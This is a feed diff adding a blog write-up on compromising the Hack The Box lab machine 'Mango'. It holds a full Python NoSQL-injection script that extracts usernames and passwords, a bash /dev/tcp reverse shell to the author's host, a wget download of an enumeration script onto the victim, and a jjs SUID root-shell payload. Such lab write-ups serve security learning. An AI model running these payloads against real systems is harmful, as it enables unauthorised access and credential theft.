@@ -5,8 +5,399 @@
         <description>Recent content in Posts on Forest Hex</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 30 May 2020 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Thu, 04 Jun 2020 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://foresthex.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Hack The Box - Mango</title>
+            <link>https://foresthex.com/posts/hack-the-box-mango/</link>
+            <pubDate>Thu, 04 Jun 2020 00:00:00 +0000</pubDate>
+            
+            <guid>https://foresthex.com/posts/hack-the-box-mango/</guid>
+            <description>Welcome to another Forest Hex hacking adventure! 🌲🏹 Today I&amp;rsquo;ll be hacking an HTB box Named Mango.
+ As always, we start with a port scan. Feel free to jump around.
+ Port Scan Investigating the Web Server Exploiting the Login Page Creating a Python Script The Final Script Getting User Getting Root   Port Scan Port Scan  Pretty standard here, SSH and a web server running on port 80 and 443 for http and https respectively.</description>
+            <content type="html"><![CDATA[<h1 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! 🌲🏹</h1>
+<p><em>Today I&rsquo;ll be hacking an HTB box Named Mango.</em></p>
+
+    <figure class="left" >
+        <img src="1575440078.png"   />
+
+        
+    </figure>
+
+
+<p>As always, we start with a port scan. Feel free to jump around.</p>
+<ul>
+<li><a href="#port-scan">Port Scan</a></li>
+<li><a href="#investigating-the-web-server">Investigating the Web Server</a></li>
+<li><a href="#exploiting-the-login-page">Exploiting the Login Page</a></li>
+<li><a href="#creating-a-python-script">Creating a Python Script</a></li>
+<li><a href="#the-final-script">The Final Script</a></li>
+<li><a href="#getting-user">Getting User</a></li>
+<li><a href="#getting-root">Getting Root</a></li>
+</ul>
+<hr>
+<h1 id="port-scan">Port Scan</h1>
+
+    <figure class="left" >
+        <img src="1575440838.png"   />
+
+        
+            <figcaption class="center" >Port Scan</figcaption>
+        
+    </figure>
+
+
+<p>Pretty standard here, SSH and a web server running on port 80 and 443 for http and https respectively.
+It looks like the port 80 one got a 403 error from nmap so let&rsquo;s check out the https one.</p>
+<hr>
+<h1 id="investigating-the-web-server">Investigating the Web Server</h1>
+
+    <figure class="left" >
+        <img src="1575440976.png"   />
+
+        
+            <figcaption class="center" >Home Site</figcaption>
+        
+    </figure>
+
+
+<p>A google clone, neat. From the looks of it I can use the analytics page with full functionality. It&rsquo;s using PHP according to wappalyzer, and not much else.</p>
+<p>After some investigation it turned out the analytics is running software called flexmonster. There may be exploit potential there, but first I decided to load up ZAP and run a vuln scan. It came up empty for the most part, nothing useful.</p>
+<p>Searchsploit came up with nothing about flexmonster exploits, and a google search showed some potential but sparse forum posts from concerned users rather than disclosures. I decided to try gobuster at this point to find any hidden directories.</p>
+<p><code>gobuster dir -u &quot;https://10.10.10.162/&quot; -r -a &quot;Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k</code></p>
+<p><code>-k</code> ignores SSL issues, <code>-a</code> sets my user-agent to a normal one in case they have detection, and <code>-r</code> follows redirects. I point it to a decent directory list and go.</p>
+
+    <figure class="left" >
+        <img src="1575445364.png"   />
+
+        
+            <figcaption class="center" >GoBuster Running</figcaption>
+        
+    </figure>
+
+
+
+    <figure class="left" >
+        <img src="1575472573.png"   />
+
+        
+            <figcaption class="center" >No GoBuster Results</figcaption>
+        
+    </figure>
+
+
+<p>No luck, just a forbidden apache page. I decided to try nikto next, an apache web server scanner.
+<code>nikto -host &quot;https://10.10.10.162&quot;</code></p>
+<p>Off the bat we got some domain info from the SSL cert:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">CN<span style="color:#f92672">=</span>staging-order.mango.htb
+emailAddress<span style="color:#f92672">=</span>admin@mango.htb
+</code></pre></div><p>I also should have noticed that from the nmap scan. While nikto was running I decided to add the hostname to <code>/etc/hosts</code> and navigate to it.</p>
+<h1 id="exploiting-the-login-page">Exploiting the Login Page</h1>
+<p>
+    <figure class="left" >
+        <img src="1575474049.png"   />
+
+        
+            <figcaption class="center" >Login Page</figcaption>
+        
+    </figure>
+
+
+Paydirt! Here&rsquo;s a login page and we at least know there&rsquo;s one user named admin probably.</p>
+<p>I played around with this page for quite a while. I ran a ZAP vuln scan and test some basic SQL injection but had no luck. I ran nikto and even wapiti, but came up empty.</p>
+
+    <figure class="left" >
+        <img src="1575601487.png"   />
+
+        
+            <figcaption class="center" >No Vulns Found</figcaption>
+        
+    </figure>
+
+
+<p>I then decided to try some other forms of injection, maybe it&rsquo;s not running SQL at all. I looked up some NoSQL injection techniques and after a little playing around I found a way in. I had to modify the POST request to get it to work, which was easy since I had the site loaded in a ZAP proxy which injects a nice front end on top of the site. Check it out:</p>
+
+    <figure class="left" >
+        <img src="gotin.gif"   />
+
+        
+            <figcaption class="center" >NoSQLi</figcaption>
+        
+    </figure>
+
+
+<p>As you can see we are able to login, but it&rsquo;s kind of useless at the moment. It&rsquo;s under construction and investigating the source doesn&rsquo;t reveal any new information. However, armed with a success case for NoSQLi, we can brute force character by character to get account information. This could let us into other places, perhaps even SSH access if we are lucky.</p>
+<p>Now I&rsquo;m not familiar with mongoDB, which is the DB being used based on the noSQL injection that worked, but I&rsquo;ve learned enough to know where to look.</p>
+<p><a href="https://docs.mongodb.com/manual/reference/operator/query/">https://docs.mongodb.com/manual/reference/operator/query/</a> - A lovely reference on what&rsquo;s called Query and Projection operators. This is why the injection works using <code>$gt</code>, it stands for greater than and will change the logic that checks for a valid password. In short, instead of checking if you have the user password right, it will check if the user&rsquo;s password is greater than NULL. Since everything evaluates to greater than null it will always be true and it lets you in.</p>
+<p>I found a more specific blog post about what I&rsquo;m trying to achieve here:
+<a href="https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/">https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/</a></p>
+<p>The jist of it is, we can extract information by using <code>{username: {$regex: &lt;char_to_test&gt;.*}}</code>. Mongo will evaluate the regular expression that&rsquo;s provided. Regex is a pretty big topic of it&rsquo;s own, but for here you only need to know that <code>.*</code> translates to mean match anything, so as long as I get <code>&lt;char_to_test&gt;</code> right it will evaluate to true and let me in.</p>
+<hr>
+<h1 id="creating-a-python-script">Creating a Python Script</h1>
+<p>Now the page above is a good starting point, but a lot of changes are in order:</p>
+<ul>
+<li>No testing regex special characters.</li>
+<li>Users are not enumerated.</li>
+<li>No valid PHP session id.</li>
+</ul>
+<p>To test for regex special characters we need to escape them with <code>\</code>. This means it will take 2 characters to test these and iterating over a string will no longer work. The solution is to iterate over an array.</p>
+<h4 id="adding-regex-special-characters">Adding Regex Special Characters</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">char_str <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;~&#39;`!@#%_=,:;/</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
+regex_escapes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;\{&#39;</span>, <span style="color:#e6db74">&#39;\}&#39;</span>, <span style="color:#e6db74">&#39;\*&#39;</span>, <span style="color:#e6db74">&#39;\^&#39;</span>, <span style="color:#e6db74">&#39;\+&#39;</span>, <span style="color:#e6db74">&#39;\?&#39;</span>, <span style="color:#e6db74">&#39;\-&#39;</span>, <span style="color:#e6db74">&#39;\&amp;&#39;</span>, <span style="color:#e6db74">&#39;\(&#39;</span>, <span style="color:#e6db74">&#39;\)&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;\&lt;&#39;</span>, <span style="color:#e6db74">&#39;\&gt;&#39;</span>, <span style="color:#e6db74">&#39;\|&#39;</span>]
+chars_to_test <span style="color:#f92672">=</span> list(char_str) <span style="color:#f92672">+</span> regex_escapes
+</code></pre></div><p>The above code takes all single character possibilities that aren&rsquo;t regex special characters and combines them into a single string: <code>char_str</code>.  It then defines an array of escaped regex special characters, and finally it converts <code>char_str</code> into a list and concatenate it to the list of escaped regular expressions.</p>
+<p>I can now iterate <code>chars_to_test</code> and it will test all special characters, including those which would normally be interperted differently in the regular expression.</p>
+<hr>
+<h4 id="extracting-users">Extracting Users</h4>
+<p>To grab the users instead of the password the payload has to be changed:
+<code>username[$regex]=^&lt;CHAR_TO_TEST&gt;.*&amp;password[$gt]=&amp;login=login</code></p>
+<p>Also the method should be different. It&rsquo;s possible to have user with several of the same starting letters, so instead of stopping at the first character we match the logic will go as follows:</p>
+<pre><code>1. Start with an empty list of users.
+2. Send users to a function which will attempt to find all users.
+   a. If the list is empty:       
+      i. Iterate through every character to test.
+      ii. Append to new list if valid.
+      iii. Return new list of valid characters.
+   b. If the list is not empty:
+      i. Iterate through each user in the list.
+         a. Iterate through every character to test, appending it to the username.
+         b. Append to new list if valid.
+         c. Return list list of valid user strings.
+3. If the original list of users == the new list:
+   a. Return the list, users fully enumerated at this point.
+4. If the original list of users != the new list:
+   a. Replace the original list of users with the new one.
+   b. Return to step 2 where we send users to function.
+
+</code></pre><p>This method ensures the script won&rsquo;t stop at the first valid character for each attempt, and will allow the known users list size to increase as it finds more valid combinations.</p>
+<p><code>['a', 'm']</code> could turn into <code>['ad', 'ma', 'mi']</code> for example if we had <code>admin</code>, <code>matt</code>, and <code>mike</code> as valid values. Once the new list returned is the same as the old one then there is no reason to continue enumerating as it would just repeat infinitely.</p>
+<hr>
+<h4 id="grabbing-the-php-session-id">Grabbing the PHP Session ID</h4>
+<p>It&rsquo;s important to keep the headers valid for these requests. To do so I just copied the valid headers I interecepted in ZAP and did a little regex replace magic to create a dictionary object in python for use with the popular <code>requests</code> module. One issue with just using it directly like that is the PHP Session ID cookie changes, and I don&rsquo;t want to manually update it every time it expires.</p>
+<p>Grabbing it is very easy with the <code>requests</code> module:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">grab_sessid_header</span>():
+    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span>, headers<span style="color:#f92672">=</span>headers, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span>False)
+    phpid <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>]
+    cookie_header <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Cookie&#39;</span>: f<span style="color:#e6db74">&#39;PHPSESSID={phpid}&#39;</span>}
+    <span style="color:#66d9ef">return</span> cookie_header
+</code></pre></div><p>As well as adding it to your <code>headers</code> dictionary:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">headers<span style="color:#f92672">.</span>update(grab_sessid_header())
+</code></pre></div><hr>
+<h1 id="the-final-script">The Final Script</h1>
+<p>The end result is a script that enumerates all users first, and then attempts to find the passwords for each.
+You can see it in action:</p>
+
+    <figure class="left" >
+        <img src="cracking.gif"   />
+
+        
+            <figcaption class="center" >Script in Action</figcaption>
+        
+    </figure>
+
+
+<p>Here&rsquo;s the full script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+<span style="color:#75715e"># proxies = {&#34;http&#34;: &#34;http://127.0.0.1:12480&#34;, &#34;https&#34;: &#34;http://127.0.0.1:12480&#34;}</span>
+proxies <span style="color:#f92672">=</span> {}
+headers <span style="color:#f92672">=</span> {
+<span style="color:#e6db74">&#39;User-Agent&#39;</span>:<span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0&#39;</span>,
+<span style="color:#e6db74">&#39;Accept&#39;</span>:<span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span>,
+<span style="color:#e6db74">&#39;Accept-Language&#39;</span>:<span style="color:#e6db74">&#39;en-US,en;q=0.5&#39;</span>,
+<span style="color:#e6db74">&#39;Content-Type&#39;</span>:<span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
+<span style="color:#e6db74">&#39;Origin&#39;</span>:<span style="color:#e6db74">&#39;https://staging-order.mango.htb&#39;</span>,
+<span style="color:#e6db74">&#39;Connection&#39;</span>:<span style="color:#e6db74">&#39;keep-alive&#39;</span>,
+<span style="color:#e6db74">&#39;Referer&#39;</span>:<span style="color:#e6db74">&#39;https://staging-order.mango.htb/&#39;</span>,
+<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>:<span style="color:#e6db74">&#39;1&#39;</span>,
+<span style="color:#e6db74">&#39;Host&#39;</span>:<span style="color:#e6db74">&#39;staging-order.mango.htb&#39;</span>
+}
+
+<span style="color:#75715e"># Returns Chars: [a, c], stops at first if desired, this is useful for passwords</span>
+<span style="color:#75715e"># Expects &lt;CHAR&gt;, replaces with actual char</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_chars</span>(payload, stop_at_first <span style="color:#f92672">=</span> False):
+    valid_chars <span style="color:#f92672">=</span> []
+    char_str <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;~&#39;`!@#%_=,:;/</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
+    regex_escapes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;\{&#39;</span>, <span style="color:#e6db74">&#39;\}&#39;</span>, <span style="color:#e6db74">&#39;\*&#39;</span>, <span style="color:#e6db74">&#39;\^&#39;</span>, <span style="color:#e6db74">&#39;\+&#39;</span>, <span style="color:#e6db74">&#39;\?&#39;</span>, <span style="color:#e6db74">&#39;\-&#39;</span>, <span style="color:#e6db74">&#39;\&amp;&#39;</span>, <span style="color:#e6db74">&#39;\(&#39;</span>, <span style="color:#e6db74">&#39;\)&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;\&lt;&#39;</span>, <span style="color:#e6db74">&#39;\&gt;&#39;</span>, <span style="color:#e6db74">&#39;\|&#39;</span>]
+    chars_to_test <span style="color:#f92672">=</span> list(char_str) <span style="color:#f92672">+</span> regex_escapes
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> chars_to_test:
+        data <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&lt;CHAR&gt;&#39;</span>, i)
+        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span>, data<span style="color:#f92672">=</span>data, allow_redirects<span style="color:#f92672">=</span>False, headers<span style="color:#f92672">=</span>headers, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span>False)
+        <span style="color:#66d9ef">if</span> res<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>:
+            valid_chars<span style="color:#f92672">.</span>append(i[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:])
+            <span style="color:#66d9ef">if</span> stop_at_first:
+                <span style="color:#66d9ef">return</span> valid_chars
+    <span style="color:#66d9ef">return</span> valid_chars
+
+<span style="color:#75715e"># Iterates through all known starts to user strings, attempts to find all valid chars for each</span>
+<span style="color:#75715e"># Returns an updated list of found users</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_users</span>(users):
+    user_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;username[$regex]=^&lt;CHAR&gt;.*&amp;password[$gt]=&amp;login=login&#39;</span>
+    new_found_users <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">if</span> len(users) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        found_users <span style="color:#f92672">=</span> iterate_chars(user_payload)
+        <span style="color:#66d9ef">print</span>(found_users)
+        <span style="color:#66d9ef">return</span> found_users
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users:
+            user_payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;username[$regex]=^{user}&lt;CHAR&gt;.*&amp;password[$gt]=&amp;login=login&#39;</span>
+            new_chars <span style="color:#f92672">=</span> iterate_chars(user_payload)
+            <span style="color:#66d9ef">if</span> len(new_chars) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+                new_found_users<span style="color:#f92672">.</span>append(user)
+            <span style="color:#66d9ef">else</span>:  
+                <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> new_chars:
+                    new_found_users<span style="color:#f92672">.</span>append(user<span style="color:#f92672">+</span>char[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:])
+        <span style="color:#66d9ef">print</span>(new_found_users)
+        <span style="color:#66d9ef">return</span> new_found_users 
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_user_password</span>(user):
+    found_chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">while</span> True:
+        pass_payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;username={user}&amp;password[$regex]=^{found_chars}&lt;CHAR&gt;.*&amp;login=login&#39;</span>
+        new_char <span style="color:#f92672">=</span> iterate_chars(pass_payload, True)
+        <span style="color:#66d9ef">if</span> len(new_char) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+            <span style="color:#66d9ef">break</span>
+        found_chars <span style="color:#f92672">+=</span> new_char[<span style="color:#ae81ff">0</span>]
+        <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;{user}: {found_chars}&#39;</span>)
+    <span style="color:#66d9ef">return</span> found_chars
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_passwords</span>(users):
+    creds <span style="color:#f92672">=</span> { user : <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users}
+    <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> creds:
+        creds[user] <span style="color:#f92672">=</span> find_user_password(user)
+    <span style="color:#66d9ef">return</span> creds
+
+<span style="color:#75715e"># Returns the PHP session ID as a header for requests to update with</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">grab_sessid_header</span>():
+    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span>, headers<span style="color:#f92672">=</span>headers, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span>False)
+    phpid <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>]
+    cookie_header <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Cookie&#39;</span>: f<span style="color:#e6db74">&#39;PHPSESSID={phpid}&#39;</span>}
+    <span style="color:#66d9ef">return</span> cookie_header
+
+<span style="color:#75715e"># Returns an array of usernames</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_all_users</span>():
+    found_users <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">while</span> True:
+        new_found_users <span style="color:#f92672">=</span> iterate_users(found_users)
+        <span style="color:#66d9ef">if</span> new_found_users <span style="color:#f92672">==</span> found_users: 
+            <span style="color:#66d9ef">print</span>(found_users)
+            <span style="color:#66d9ef">break</span>
+        found_users <span style="color:#f92672">=</span> new_found_users
+    <span style="color:#66d9ef">return</span> found_users
+
+<span style="color:#75715e"># Grab a new session id first</span>
+headers<span style="color:#f92672">.</span>update(grab_sessid_header())
+users <span style="color:#f92672">=</span> find_all_users()
+<span style="color:#75715e"># users = [&#39;admin&#39;, &#39;mango&#39;]</span>
+<span style="color:#75715e"># {&#39;admin&#39;: &#39;t9KcS3&gt;!0B#2&#39;, &#39;mango&#39;: &#39;h3mXK8RhU~f{]f5H&#39;}</span>
+creds <span style="color:#f92672">=</span> iterate_passwords(users)
+<span style="color:#66d9ef">print</span>(creds)
+</code></pre></div><p>You can see the credentials it found above.</p>
+<hr>
+<h1 id="getting-user">Getting User</h1>
+<p>The credentials worked for <code>mango</code> but not <code>admin</code>.
+<code>ssh mango@mango.htb</code></p>
+<p>There was no <code>user.txt</code> file in his home folder, I decided to use <code>find</code> to locate it.
+<code>find / -name user.txt  2&gt;&amp;1 | grep -v &quot;Permission denied&quot;</code></p>
+
+    <figure class="left" >
+        <img src="1575759645.png"   />
+
+        
+            <figcaption class="center" >Found user.txt</figcaption>
+        
+    </figure>
+
+
+<p>Ah ha, it&rsquo;s under admin! Maybe the password will work locally if I just use <code>su admin</code></p>
+
+    <figure class="left" >
+        <img src="1575759733.png"   />
+
+        
+            <figcaption class="center" >User Flag</figcaption>
+        
+    </figure>
+
+
+<p>Nice, got it. This was a pretty fun route to user, I always enjoy creating my own exploits.</p>
+<hr>
+<h1 id="getting-root">Getting Root</h1>
+<p>This shell looks weird immediately. I run <code>/bin/bash</code> and it returns to the normal prompt, prepended with the user and current directory.</p>
+<p>I then checked out what processes were running as root, apache was one of them. I checked the version number: 2.4.29, vulnerable to a local privesc: <a href="https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html">https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html</a></p>
+<p>I don&rsquo;t really want to wait around until 6:45 am, and I don&rsquo;t have rights to change the time on the machine so I can&rsquo;t force it. It&rsquo;s time to run <code>lse.sh</code> and see what it says. I downloaded it onto the victim by using <code>python -m SimpleHTTPServer</code> on kali in the folder I have <code>lse.sh</code>.</p>
+<p>On the victim I ran: <code>wget http://10.10.14.66:8000/lse.sh</code> and then <code>chmod +x lse.sh</code> to download it and allow it to be executed. It came back with a couple of unusual SUID binaries:</p>
+
+    <figure class="left" >
+        <img src="1575830306.png"   />
+
+        
+    </figure>
+
+
+<p>Mailcap seemed to require sudo access to get root. I gave it a shot, but it asked for a sudo password and neither of the passwords I have worked.</p>
+<p>JJS seemed more promising, I found it also listed on GTFOBins: <a href="https://gtfobins.github.io/gtfobins/jjs/">https://gtfobins.github.io/gtfobins/jjs/</a></p>
+<p>It looks like if the SUID bit is set, you can get root without sudo. You can see the commands at the bottom:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo sh -c <span style="color:#e6db74">&#39;cp $(which jjs) .; chmod +s ./jjs&#39;</span>
+
+echo <span style="color:#e6db74">&#34;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> &gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> 2&gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;).waitFor()&#34;</span> | ./jjs
+</code></pre></div><p>Now wait, there&rsquo;s sudo in the first command!</p>
+<p>Yep, but look at the command, it&rsquo;s copying JJS and setting the SUID bit on it. The binary on the system I&rsquo;m hacking already has this set so I don&rsquo;t need to run that command. I&rsquo;ll also need to change the binary the second command is piped into.</p>
+
+    <figure class="left" >
+        <img src="1575830716.png"   />
+
+        
+            <figcaption class="center" >Root ... but, not quite.</figcaption>
+        
+    </figure>
+
+
+<p>It looks like I popped a root shell consider the prompt changed from <code>$</code> into <code>#</code>.
+But&hellip; I can&rsquo;t interact with it. It&rsquo;s blinking, but any input is just ignored. Shame really, but there&rsquo;s a solution, instead of spawning a local shell I can spawn a reverse shell and the input issue should be resolved. I usually grab one from here:
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></p>
+<p>First I&rsquo;ll test if I can pop a reverse shell manually with the following commands:</p>
+<pre><code>On Victim: `/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.66/15462 0&gt;&amp;1`
+On Host: `nc -nvlp 15462`
+</code></pre>
+    <figure class="left" >
+        <img src="1575831156.png"   />
+
+        
+    </figure>
+
+
+
+    <figure class="left" >
+        <img src="1575831185.png"   />
+
+        
+    </figure>
+
+
+<p>It works! I got a shell from the user running the command, so if I can get JJS to run it as root I should get a root shell.
+After a lot of playing around I did not manage to pop a reverse shell.</p>
+<hr>
+<h2 id="finally-getting-it-to-work">Finally getting it to work</h2>
+<p>I realized at one point that it was running <code>dash</code> instead of <code>bash</code> and maybe that was messing up the prompt input.</p>
+<p>I changed the command to:
+<code>echo &quot;Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc \$@|sh\${IFS}-p _ echo /bin/bash -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)').waitFor()&quot; | jjs</code></p>
+<p>As I typed the input did not show, but I tried it anyway:</p>
+
+    <figure class="left" >
+        <img src="1575833023.png"   />
+
+        
+            <figcaption class="center" >Root Flag</figcaption>
+        
+    </figure>
+
+
+<p>Success! Although I couldn&rsquo;t see my input the commands were now run. This was a very enjoyable box and I learned a lot about noSQL injection. Until next time this is jivex5k signing off!</p>
+]]></content>
+        </item>
         
         <item>
             <title>Hack The Box - Obscurity</title>
